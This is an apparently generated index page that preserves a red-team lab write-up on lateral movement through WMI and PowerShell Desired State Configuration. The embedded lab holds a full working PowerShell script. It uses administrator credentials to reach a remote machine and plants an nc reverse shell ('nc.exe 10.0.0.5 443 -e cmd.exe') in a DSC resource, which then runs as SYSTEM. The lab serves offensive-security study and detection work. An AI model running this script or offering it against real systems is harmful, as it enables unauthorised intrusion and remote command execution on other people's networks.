---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# WMI + PowerShell Desired State Configuration Lateral Movement

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-wmi-powershell-desired-state-configuration-lateral-movement` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/wmi-+-powershell-desired-state-configuration-lateral-movement.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [WMI + PowerShell Desired State Configuration Lateral Movement](../../topics/offensive-security/wmi-powershell-desired-state-configuration-lateral-movement.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-wmi-powershell-desired-state-configuration-lateral-movement |
| name | WMI + PowerShell Desired State Configuration Lateral Movement |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/wmi-+-powershell-desired-state-configuration-lateral-movement.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-11-01 21-48.gif
- Screenshot from 2018-11-01 22-00-51.png
_body: "---\ndescription: Lateral Movment, Privilege Escalation\n---\n\n# WMI + PowerShell Desired State Configuration Lateral\
  \ Movement\n\nThis lab is simply a test of the lateral movement technique desrcibed by Matt Graeber [here](https://posts.specterops.io/abusing-powershell-desired-state-configuration-for-lateral-movement-ca42ddbe6f06).\n\
  \n## Execution\n\nBelow is the powershell script that allows an attacker to execute code on a remote machine via WMI. Note\
  \ that the payload is defined in the variable `TestScript` on line 7. In our case, the payload is a rudimentary nc reverse\
  \ shell (luckily, we know the victim has nc on their machine :):\n\n{% code title=\"dsc.ps1\" %}\n```csharp\n# Credits to\
  \ Matt Graeber. Code taken from https://posts.specterops.io/abusing-powershell-desired-state-configuration-for-lateral-movement-ca42ddbe6f06\n\
  $MOFContents = @'\ninstance of MSFT_ScriptResource as $MSFT_ScriptResource1ref\n{\n\tResourceID = \"[Script]ScriptExample\"\
  ;\n\tGetScript = \"\\\"$(Get-Date): I am being GET\\\" \t| Out-File C:\\\\Windows\\\\Temp\\\\ScriptRun.txt -Append; return\
  \ $True\";\n\tTestScript = \"C:\\\\tools\\\\nc.exe 10.0.0.5 443 -e cmd.exe\";\n\tSetScript = \"\\\"$(Get-Date): I am being\
  \ SET\\\" \t| Out-File C:\\\\Windows\\\\Temp\\\\ScriptRun.txt -Append; return $True\";\n\tSourceInfo = \"::3::5::Script\"\
  ;\n\tModuleName = \"PsDesiredStateConfiguration\";\n\tModuleVersion = \"1.0\";\n\tConfigurationName = \"ScriptTest\";\n\
  };\n \ninstance of OMI_ConfigurationDocument\n{\n\tVersion=\"2.0.0\";\n\tMinimumCompatibleVersion = \"1.0.0\";\n\tCompatibleVersionAdditionalProperties=\
  \ {\"Omi_BaseResource:ConfigurationName\"};\n\tAuthor=\"TestUser\";\n\tGenerationDate=\"02/26/2018 07:09:21\";\n\tGenerationHost=\"\
  TestHost\";\n\tName=\"ScriptTest\";\n};\n'@\n\n# Change this to false if you want to test the payload locally\n$ExecuteRemotely\
  \ = $True\n \n$NormalizedMOFContents = [Text.Encoding]::UTF8.GetString([Text.Encoding]::ASCII.GetBytes($MOFContents))\n\
  $NormalizedMOFBytes = [Text.Encoding]::UTF8.GetBytes($NormalizedMOFContents)\n$TotalSize = [BitConverter]::GetBytes($NormalizedMOFContents.Length\
  \ + 4)\n \nif ($ExecuteRemotely) {\n\t# Prepend the length of the payload\n\t[Byte[]] $MOFBytes = $TotalSize + $NormalizedMOFBytes\n\
  } else {\n\t# If executing locally, you do not prepend the payload length\n\t[Byte[]] $MOFBytes = $NormalizedMOFBytes\n\
  }\n\n\n# Specify the credentials of your target\n$Credential = Get-Credential -Credential \"offense\\administrator\"\n$ComputerName\
  \ = 'ws02'\n \n# Establish a remote WMI session with the target system\n$RemoteCIMSession = New-CimSession -ComputerName\
  \ $ComputerName -Credential $Credential\n \n$LCMClass = Get-CimClass -Namespace root/Microsoft/Windows/DesiredStateConfiguration\
  \ -ClassName MSFT_DSCLocalConfigurationManager -CimSession $RemoteCIMSession\n \nif ($LCMClass -and $LCMClass.CimClassMethods['ResourceTest'])\
  \ {\n\t# You may now proceed with lateral movement\n \n\t$MethodArgs = @{\n    \tModuleName   \t= 'PSDesiredStateConfiguration'\n\
  \    \tResourceType \t= 'MSFT_ScriptResource'\n    \tresourceProperty = $MOFBytes\n\t}\n \n\t$Arguments = @{\n    \tNamespace\
  \  = 'root/Microsoft/Windows/DesiredStateConfiguration'\n    \tClassName  = 'MSFT_DSCLocalConfigurationManager'\n    \t\
  MethodName = 'ResourceTest'\n    \tArguments  = $MethodArgs\n    \tCimSession = $RemoteCIMSession\n\t}\n \n\t# Invoke the\
  \ DSC script resource Test method\n\t# Successful execution will be indicated by \"InDesiredState\" returning True and ReturnValue\
  \ returning 0.\n\tInvoke-CimMethod @Arguments\n \n} else {\n\tWrite-Warning 'The DSC lateral movement method is not available\
  \ on the remote system.'\n}\n```\n{% endcode %}\n\nThe technique is captured in action in a gif below. On the left is the\
  \ attacking system, on the right is the victim system and the window above the victim screen is another attacking system\
  \ that is receiving the reverse shell:\n\n![](<../../.gitbook/assets/Peek 2018-11-01 21-48.gif>)\n\n## Observations\n\n\
  Note the process ancestry and that our code was run with privileges of`NT AUTHORITY\\SYSTEM`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-01 22-00-51.png>)\n\n## References\n\n{% embed url=\"https://posts.specterops.io/abusing-powershell-desired-state-configuration-for-lateral-movement-ca42ddbe6f06\"\
  \ %}"
_relative_path: offensive-security/lateral-movement/wmi-+-powershell-desired-state-configuration-lateral-movement.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/wmi-+-powershell-desired-state-configuration-lateral-movement.md
````
